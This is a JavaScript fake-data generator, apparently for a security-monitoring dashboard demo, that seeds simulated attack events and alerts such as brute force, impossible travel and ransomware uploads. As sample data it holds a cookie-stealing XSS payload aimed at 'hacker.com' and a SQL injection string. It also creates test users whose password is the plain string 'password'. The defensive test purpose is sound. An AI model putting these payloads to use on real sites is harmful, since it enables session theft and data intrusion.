import Event from '../models/Event.js';
import Alert from '../models/Alert.js';
import User from '../models/User.js';

/**
 * FAKE DATA GENERATOR
 * Creates realistic fake security events for testing
 */

// List of fake IP addresses (attackers) - DIVERSE LIST
const fakeIPs = [
  '192.168.1.100', '10.0.0.5', '172.16.0.50', '203.0.113.42', '198.51.100.23',
  '45.33.22.11', '104.244.78.45', '185.220.101.9', '192.168.0.105', '172.31.255.255',
  '23.45.67.89', '128.0.0.1', '185.10.10.10', '192.0.2.1', '198.18.0.1',
  '100.64.0.1', '10.10.10.10', '172.16.254.1', '192.168.1.1', '192.168.1.254',
  '203.112.45.89', '49.32.12.55', '14.139.60.12', '103.21.244.0', '115.110.22.11',
  '157.240.16.35', '31.13.79.35', '66.220.144.0', '69.63.176.0', '74.119.76.0',
  '173.252.64.0', '204.15.20.0', '69.171.224.0', '66.220.144.0', '204.15.20.0',
  '59.144.22.11', '60.55.22.33', '61.12.33.44', '62.44.55.66', '63.77.88.99',
  '111.90.22.11', '112.80.33.22', '113.70.44.33', '114.60.55.44', '115.50.66.55',
  '49.204.12.33', '49.35.67.99', '106.51.22.11', '122.166.44.55', '180.151.77.88'
];

// List of fake usernames - DIVERSE LIST
const fakeUsernames = [
  'satvik', 'admin', 'user123', 'test_user', 'john_doe',
  'alice_smith', 'bob_jones', 'charlie_brown', 'david_lee', 'eve_white',
  'frank_green', 'grace_hopper', 'hank_pym', 'ivy_poison', 'jack_sparrow',
  'karl_marx', 'leo_davinci', 'mike_tyson', 'nancy_drew', 'oscar_wilde',
  'peter_parker', 'quinn_harley', 'rachel_green', 'steve_jobs', 'tony_stark',
  'ursula_sea', 'victor_doom', 'wanda_maximoff', 'xena_warrior', 'yoda_jedi',
  'zack_snyder', 'aragorn_king', 'bilbo_baggins', 'clark_kent', 'diana_prince',
  'edward_snow', 'frodo_rings', 'gandalf_grey', 'harry_potter', 'indiana_jones',
  'james_bond', 'katniss_ever', 'luke_sky', 'mario_plumber', 'neo_matrix',
  'obi_wan', 'pikachu_pika', 'q_bond', 'rick_morty', 'sam_winchester'
];

// List of fake locations (Indian Cities + Global Tech Hubs)
const fakeLocations = [
  'Hyderabad', 'Mumbai', 'Delhi', 'Bangalore', 'Chennai',
  'Pune', 'Kolkata', 'Ahmedabad', 'Jaipur', 'Lucknow',
  'Surat', 'Kanpur', 'Nagpur', 'Indore', 'Thane',
  'Bhopal', 'Visakhapatnam', 'Pimpri-Chinchwad', 'Patna', 'Vadodara',
  'Ghaziabad', 'Ludhiana', 'Agra', 'Nashik', 'Faridabad',
  'Noida', 'Gurgaon', 'San Francisco', 'New York', 'London',
  'Singapore', 'Tokyo', 'Berlin', 'Moscow', 'Beijing',
  'Sydney', 'Toronto', 'Dubai', 'Paris', 'Seoul',
  'Seattle', 'Austin', 'Tel Aviv', 'Amsterdam', 'Stockholm',
  'Zurich', 'Sao Paulo', 'Hong Kong', 'Shenzhen', 'Unknown'
];

// Get random item from array
const getRandomItem = (array) => array[Math.floor(Math.random() * array.length)];

/**
 * Generate events for BRUTE FORCE attack
 * Creates 15 failed login attempts from same IP in quick succession
 */
export const generateBruteForceEvents = async () => {
  const ip = getRandomItem(fakeIPs);
  const username = getRandomItem(fakeUsernames);
  const events = [];
  
  console.log(`🔴 Generating BRUTE FORCE attack from IP: ${ip}`);
  
  // Create 15 failed login attempts (more than threshold of 10)
  for (let i = 0; i < 15; i++) {
    const event = new Event({
      type: 'login_attempt',
      ip_address: ip,
      username: username,
      success: Math.random() < 0.10, // 90% Fail, 10% Success (Better for demo visibility)
      device_id: `dev_${Math.random().toString(36).substr(2, 9)}`,
      location: getRandomItem(fakeLocations),
      time_of_login: new Date(Date.now() - (60 - i) * 1000), // Spread over 60 seconds
      otp_requests: 0,
      reset_requests: 0,
      request_rate: 0,
      session_id: `sess_${Math.random().toString(36).substr(2, 9)}`,
      user_behavior_score: Math.floor(Math.random() * 30) // Low score = suspicious
    });
    
    events.push(event);
  }
  
  // Save all events to database
  const savedEvents = await Event.insertMany(events);
  console.log(`✅ Created ${savedEvents.length} brute force events`);
  
  return savedEvents;
};

/**
 * Generate events for OTP FLOODING attack
 * Creates 12 OTP requests from same IP in 60 seconds
 */
export const generateOTPFloodingEvents = async () => {
  const ip = getRandomItem(fakeIPs);
  const username = getRandomItem(fakeUsernames);
  const events = [];
  
  console.log(`🟠 Generating OTP FLOODING attack from IP: ${ip}`);
  
  // Create 12 OTP requests (more than threshold of 8)
  for (let i = 0; i < 12; i++) {
    const event = new Event({
      type: 'otp_request',
      ip_address: ip,
      username: username,
      success: Math.random() < 0.10, // 90% Fail, 10% Success
      device_id: `dev_${Math.random().toString(36).substr(2, 9)}`,
      location: getRandomItem(fakeLocations),
      time_of_login: new Date(Date.now() - (60 - i * 5) * 1000),
      otp_requests: 1,
      reset_requests: 0,
      request_rate: 0,
      session_id: `sess_${Math.random().toString(36).substr(2, 9)}`,
      user_behavior_score: Math.floor(Math.random() * 40)
    });
    
    events.push(event);
  }
  
  const savedEvents = await Event.insertMany(events);
  console.log(`✅ Created ${savedEvents.length} OTP flooding events`);
  
  return savedEvents;
};

/**
 * Generate events for PASSWORD RESET ABUSE
 * Creates 8 reset requests from same IP in 60 seconds
 */
export const generateResetAbuseEvents = async () => {
  const ip = getRandomItem(fakeIPs);
  const username = getRandomItem(fakeUsernames);
  const events = [];
  
  console.log(`🟡 Generating RESET ABUSE attack from IP: ${ip}`);
  
  // Create 8 reset requests (more than threshold of 5)
  for (let i = 0; i < 8; i++) {
    const event = new Event({
      type: 'reset_request',
      ip_address: ip,
      username: username,
      success: Math.random() < 0.10, // 90% Fail, 10% Success
      device_id: `dev_${Math.random().toString(36).substr(2, 9)}`,
      location: getRandomItem(fakeLocations),
      time_of_login: new Date(Date.now() - (60 - i * 7) * 1000),
      otp_requests: 0,
      reset_requests: 1,
      request_rate: 0,
      session_id: `sess_${Math.random().toString(36).substr(2, 9)}`,
      user_behavior_score: Math.floor(Math.random() * 50)
    });
    
    events.push(event);
  }
  
  const savedEvents = await Event.insertMany(events);
  console.log(`✅ Created ${savedEvents.length} reset abuse events`);
  
  return savedEvents;
};

/**
 * Generate events for REQUEST FLOODING (DDoS-like)
 * Creates 150 API requests from same IP in 1 minute
 */
export const generateRequestFloodingEvents = async () => {
  const ip = getRandomItem(fakeIPs);
  const events = [];
  
  console.log(`🔴 Generating REQUEST FLOODING attack from IP: ${ip}`);
  
  // Create 150 requests (capped at 150 as per request)
  for (let i = 0; i < 150; i++) {
    const event = new Event({
      type: 'api_request',
      ip_address: ip,
      username: getRandomItem(fakeUsernames),
      success: Math.random() < 0.10, // 90% Fail, 10% Success
      device_id: `dev_${Math.random().toString(36).substr(2, 9)}`,
      location: getRandomItem(fakeLocations),
      time_of_login: new Date(Date.now() - (60 - i * 0.4) * 1000), // Updated timing for 150 events
      otp_requests: 0,
      reset_requests: 0,
      request_rate: 1,
      session_id: `sess_${Math.random().toString(36).substr(2, 9)}`,
      user_behavior_score: Math.floor(Math.random() * 30)
    });
    
    events.push(event);
  }
  
  const savedEvents = await Event.insertMany(events);
  console.log(`✅ Created ${savedEvents.length} request flooding events`);
  
  return savedEvents;
};

// ===================================
// 🚀 NEW: IMPOSSIBLE TRAVEL
// ===================================
export const generateImpossibleTravelEvents = async () => {
  const username = getRandomItem(fakeUsernames);
  const events = [];
  
  console.log(`✈️ Generating IMPOSSIBLE TRAVEL for: ${username}`);
  
  // Create Alert for this
  const alert = new Alert({
    threat_type: 'IMPOSSIBLE_TRAVEL',
    severity: 'HIGH',
    ip_address: '198.51.100.23',
    username: username,
    reason: 'Login from India then USA within 5 minutes (Speed > 8000 km/h)',
    event_count: 2
  });
  await alert.save();
  
  // Event 1: Login from Hyderabad (Now)
  events.push(new Event({
    type: 'login_attempt',
    ip_address: '103.21.244.0', // India IP
    username: username,
    success: true,
    location: 'Hyderabad, India',
    time_of_login: new Date(),
    user_behavior_score: 10 // Good score
  }));
  
  // Event 2: Login from New York (5 mins later - Impossible!)
  events.push(new Event({
    type: 'login_attempt',
    ip_address: '198.51.100.23', // USA IP
    username: username,
    success: Math.random() < 0.10, // Mostly blocked
    location: 'New York, USA',
    time_of_login: new Date(Date.now() + 5 * 60 * 1000),
    user_behavior_score: 95, // HIGH RISK
    request_rate: 0
  }));

  const savedEvents = await Event.insertMany(events);
  console.log(`✅ Created Impossible Travel events`);
  return savedEvents;
};

// ===================================
// 🕵️ NEW: TOR CONNECTION
// ===================================
export const generateTorConnectionEvents = async () => {
  const ip = '185.220.101.9'; // Known Tor Exit Node
  const username = getRandomItem(fakeUsernames);
  
  console.log(`🕵️ Generating TOR CONNECTION from: ${ip}`);
  
  const alert = new Alert({
    threat_type: 'TOR_IP_DETECTED',
    severity: 'MEDIUM',
    ip_address: ip,
    username: username,
    reason: 'Traffic detected from known Tor Exit Node',
    event_count: 1
  });
  await alert.save();
  
  const event = new Event({
    type: 'tor_connection',
    ip_address: ip,
    username: username,
    success: Math.random() < 0.10,
    device_id: 'unknown_device',
    location: 'Tor Exit Node (Russia)',
    time_of_login: new Date(),
    user_behavior_score: 85 // High Risk
  });
  
  const savedEvent = await event.save();
  return [savedEvent];
};

// ===================================
// 🌙 NEW: SUSPICIOUS TIME
// ===================================
export const generateSuspiciousTimeEvents = async () => {
  const ip = getRandomItem(fakeIPs);
  const username = 'admin'; // Usually admins targeted
  
  console.log(`🌙 Generating SUSPICIOUS TIME login for: ${username}`);
  
  const alert = new Alert({
    threat_type: 'SUSPICIOUS_TIME',
    severity: 'LOW',
    ip_address: ip,
    username: username,
    reason: 'Admin login detected at 03:14 AM (Outside business hours)',
    event_count: 1
  });
  await alert.save();

  // Set time to 3:00 AM
  const ghostTime = new Date();
  ghostTime.setHours(3, 14, 0); 
  
  const event = new Event({
    type: 'login_attempt',
    ip_address: ip,
    username: username,
    success: Math.random() < 0.10,
    location: 'Mumbai',
    time_of_login: ghostTime,
    user_behavior_score: 70 // Medium Risk
  });
  
  const savedEvent = await event.save();
  return [savedEvent];
};

// ===================================
// 🦠 NEW: MALICIOUS PAYLOAD
// ===================================
export const generateMaliciousPayloadEvents = async () => {
  // Use 'satvik' specifically for demo if possible, or random
  const username = 'satvik'; 
  const ip = getRandomItem(fakeIPs);
  
  console.log(`🦠 Generating MALICIOUS PAYLOAD (SQL Injection) for: ${username}`);
  
  const payload = "UNION SELECT * FROM passwords; --";
  
  // Create Critical Alert
  const alert = new Alert({
    threat_type: 'MALICIOUS_PAYLOAD',
    severity: 'CRITICAL',
    ip_address: ip,
    username: username,
    reason: `Malicious pattern detected in payload: "${payload}"`,
    event_count: 1
  });
  await alert.save();

  // Create Event with payload
  const event = new Event({
    type: 'api_request',
    ip_address: ip,
    username: username,
    success: false, // Blocked
    location: 'Unknown',
    time_of_login: new Date(),
    user_behavior_score: 100, // MAX RISK
    metadata: {
      payload: payload,
      user_agent: 'sqlmap/1.5.2'
    }
  });
  
  const savedEvent = await event.save();

  // 🚀 UPDATE USER SCORE TO BLOCK THEM 🚀
  let user = await User.findOne({ username });
  if (!user) {
    // Create dummy user if not exists
    user = new User({ 
      username, 
      password: 'password', 
      email: `${username}@test.com`,
      risk_score: 0 
    });
  }
  user.risk_score = 100;
  user.block_status = 'PERMANENTLY_BLOCKED';
  await user.save();
  console.log(`🚫 BLOCKED User ${username} (Risk: 100)`);
  
  return [savedEvent];
};

// ===================================
// 🎭 NEW: XSS ATTACK
// ===================================
export const generateXSSAttackEvents = async () => {
  const username = 'satvik'; // Target demo user
  const ip = getRandomItem(fakeIPs);
  
  console.log(`🎭 Generating XSS ATTACK for: ${username}`);
  
  const payload = "<script>document.location='http://hacker.com/cookie='+document.cookie</script>";
  
  // Create Critical Alert
  const alert = new Alert({
    threat_type: 'XSS_ATTACK',
    severity: 'HIGH',
    ip_address: ip,
    username: username,
    reason: `XSS Script Tag detected in input: "<script>..."`,
    event_count: 1
  });
  await alert.save();

  // Create Event
  const event = new Event({
    type: 'api_request',
    ip_address: ip,
    username: username,
    success: false, 
    location: 'Unknown',
    time_of_login: new Date(),
    user_behavior_score: 90, 
    metadata: {
      payload: payload,
      field: 'comment_body'
    }
  });
  
  const savedEvent = await event.save();

  // Block User
  let user = await User.findOne({ username });
  if (!user) {
    user = new User({ username, password: 'password', email: `${username}@test.com`, risk_score: 0 });
  }
  user.risk_score = 100;
  user.block_status = 'PERMANENTLY_BLOCKED';
  await user.save();
  console.log(`🚫 BLOCKED User ${username} (XSS Detected)`);
  
  return [savedEvent];
};

// ===================================
// 🔒 NEW: RANSOMWARE
// ===================================
export const generateRansomwareEvents = async () => {
  const username = 'satvik';
  const ip = getRandomItem(fakeIPs);
  
  console.log(`🔒 Generating RANSOMWARE Upload attempt for: ${username}`);
  
  const filename = "urgent_invoice.pdf.exe";
  
  // Create Critical Alert
  const alert = new Alert({
    threat_type: 'RANSOMWARE_DETECTED',
    severity: 'CRITICAL',
    ip_address: ip,
    username: username,
    reason: `Malicious File Extension detected: .exe (Mime-Type mismatch)`,
    event_count: 1
  });
  await alert.save();

  // Create Event
  const event = new Event({
    type: 'file_upload',
    ip_address: ip,
    username: username,
    success: false, 
    location: 'Russia',
    time_of_login: new Date(),
    user_behavior_score: 100, 
    metadata: {
      filename: filename,
      filesize: '2.4MB',
      mime_type: 'application/x-msdownload'
    }
  });
  
  const savedEvent = await event.save();

  // Block User
  let user = await User.findOne({ username });
  if (!user) {
    user = new User({ username, password: 'password', email: `${username}@test.com`, risk_score: 0 });
  }
  user.risk_score = 100;
  user.block_status = 'PERMANENTLY_BLOCKED';
  await user.save();
  console.log(`🚫 BLOCKED User ${username} (Ransomware Detected)`);
  
  return [savedEvent];
};
